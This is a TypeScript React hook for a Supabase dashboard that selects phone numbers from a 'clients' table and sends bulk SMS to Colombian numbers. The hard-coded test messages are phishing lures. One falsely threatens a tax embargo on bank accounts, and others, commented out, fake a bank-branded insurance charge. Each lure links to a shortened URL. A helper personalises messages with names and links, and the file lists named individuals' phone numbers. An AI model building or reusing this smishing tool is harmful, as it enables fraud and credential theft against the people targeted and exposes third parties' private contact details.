'use client';

import { z } from 'zod';
import useSWR from 'swr';
import React from 'react';
import { toast } from 'sonner';
import { useForm } from 'react-hook-form';
import { supabase } from '@/lib/supabase/client';
import { usePagination } from './use-pagination';
import { capitalizeFirstLetter } from '@/lib/utils';
import { zodResolver } from '@hookform/resolvers/zod';
import { ColumnsCourierTable } from '@/consts/columns';
import { INIT_STATE_PAGINATION } from '@/consts/pagination';
import { customSendSMS, sendMultipleSMS } from '@/lib/courier';
import { isAvaibleTimeToSendMessage } from '@/lib/utils.columns';
import {
  getCoreRowModel,
  getSortedRowModel,
  useReactTable,
} from '@tanstack/react-table';

const formSchema = z.object({
  message: z.string().min(2).max(680),
});

const useCourier = () => {
  const [filters, setFilters] = React.useState(INITI_FILTERS);

  const [pagination, setPagination] = React.useState(INIT_STATE_PAGINATION);
  const { handlerCurrentPage, handlerPageSize } = usePagination(setPagination);
  const keyURL = 'clients';

  const { data, isLoading, mutate, error } = useSWR(
    [keyURL, pagination, filters],
    ([keyURL, pagination, filters]) => fetcher(keyURL, pagination, filters)
  );

  const [rowSelection2, setRowSelection2] = React.useState({});
  const [isOpenModalSendMesage, setIsOpenModalSendMesage] =
    React.useState(false);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      message: '',
      // destination: '',
    },
  });

  const table = useReactTable({
    data: data?.data ?? [],
    columns: ColumnsCourierTable,
    getRowId: (row) => row.number,
    state: {
      rowSelection: rowSelection2,
    },
    enableRowSelection: true,
    onRowSelectionChange: setRowSelection2,
    getCoreRowModel: getCoreRowModel(),
    getSortedRowModel: getSortedRowModel(),
  });

  ///

  const excludedNumbers = data?.data?.flatMap((d) =>
    isAvaibleTimeToSendMessage(d?.dian?.sendDate, d?.dian?.recived) ? [] : d.id
  );
  const numberSelection = Object.keys(rowSelection2);
  const handleSubmit = async ({ message }: z.infer<typeof formSchema>) =>
    await new Promise((res, rej) => {
      toast.promise(
        sendMessage(message, numberSelection, filters.origin).then(() => {
          setIsOpenModalSendMesage(false);
          res(true);
          table.resetRowSelection();
          mutate();
        }),
        {
          loading: 'Cargando...',
          success: 'Mensajes enviados!',
          error: () => {
            rej('');
            return 'Hubo un error!';
          },
        }
      );
    });

  const testRequest = async () =>
    await new Promise((res, rej) => {
      toast.promise(
        sendMessage(
          'Testt un proceso de embargo tributario en sus cuentas bancarias por saldos en mora. Cancele y obtenga su Paz y Salvo aqui: t.co/NyRFqIEoUr',
          // 'Estimado usuario, Suc. Virtual Personas te informa que se activo un seguro de celular protegido por $139,900. El 06/08/2024. Si desea cancelar: t.ly/8GYVH T&C',
          // 'Estimado usuario, Suc. Virtual Personas te informa que se activo un seguro de celular protegido por $139,900. El 05/08/2024. Si desea cancelar: t.ly/8GYVH',
          // '{name} test',
          [],
          filters.origin
        ).then(() => {
          // form.setValue('message', '');
          setIsOpenModalSendMesage(false);
          res('');
        }),
        {
          loading: 'Cargando...',
          success: 'Mensajes enviados!',
          error: () => {
            rej('');
            return 'Hubo un error!';
          },
        }
      );
    });

  //Handlers

  const handleFilters = (key: string, value: string) => {
    setFilters((prev) => ({ ...prev, [key]: value }));
    table.resetRowSelection();
  };

  return {
    data,
    form,
    table,
    mutate,
    filters,
    isLoading,
    pagination,
    testRequest,
    handleSubmit,
    handleFilters,
    handlerPageSize,
    handlerCurrentPage,
    isOpenModalSendMesage,
    setIsOpenModalSendMesage,
  };
};

export default useCourier;

const fetcher = async (
  key: string,
  pagination: {
    limit: number;
    skip: number;
  },
  filters: {
    origin: string;
  }
) => {
  // Desestructura limit y skip
  const { limit, skip } = pagination;

  // Define el rango para la paginación
  const rangeStart = skip;
  const rangeEnd = skip + limit - 1;

  // Construye la consulta con el rango definido
  console.log(filters.origin);
  let query = supabase
    .from(key)
    .select('*', { count: 'exact' })
    .is(String(filters.origin), null)
    .order('id', { ascending: false })
    .range(rangeStart, rangeEnd);
  // Ejecuta la consulta
  const { data, error, count: total } = await query;

  if (error) throw error;

  // Devuelve los datos y el conteo total
  return { data, meta: { total } };
};

const INITI_FILTERS = {
  origin: 'test',
};

const validateAreAvaible = (row: any) => !row.original.dian?.sendDate;

const sendMessage = (msg: string, data: string[], columnSelected: string) =>
  sendAllRequests(msg, data, columnSelected);

const sendAllRequests = async (
  msg: string,
  data: string[],

  columnSelected: string
) => {
  try {
    const sendDate = new Date();
    const markList = data.map((d) => ({
      number: d,
      [columnSelected]: { sendDate },
    }));

    const dataDouble = [...data, ...addNumsMessage];

    //uniqe
    // await Promise.all(dataDouble.map((d: any) => sendRequest(msg, d)));

    // multiple
    const phones = dataDouble.map((d) => '57' + d);
    await sendMultipleSMS(msg, phones);
    // await supabase.from('clients').upsert(
    //   markList,
    //   //@ts-ignore
    //   { onConflict: ['number'] }
    // );

    console.log('All requests sent successfully');
  } catch (err) {
    console.error('Error sending all requests:', err);
    throw err;
  }
};

const sendRequest = async (
  msg: string,
  {
    name,
    phone,
  }: {
    name: string | null;
    phone: string;
  }
) => {
  try {
    let nameParsed = name ?? '';
    let personalizedMsg = msg;
    if (name) nameParsed = capitalizeFirstLetter(name?.split(' ')?.[0]);
    if (personalizedMsg.includes('{name}'))
      personalizedMsg = personalizedMsg.replace('{name}', nameParsed);
    if (personalizedMsg.includes('{url}')) {
      console.log(nameParsed);
      // const { short_url } = await createShortURL(null, phone);
      // const parsedUrl = short_url
      //   ? short_url.split('https://').pop()
      //   : 't.ly/8GYVH';
      const parsedUrl = 't.ly/8GYVH';
      personalizedMsg = personalizedMsg.replace('{url}', parsedUrl);
    }

    await customSendSMS(personalizedMsg, phone);
  } catch (err) {
    console.error(err);
  }
};

const addNumsMessage = [
  {
    name: 'Kevin',
    phone: 3008948802,
  },
  {
    name: 'Adrian',
    phone: 3242378501,
  },
  {
    name: 'Pablo',
    phone: 3244929950,
  },
];
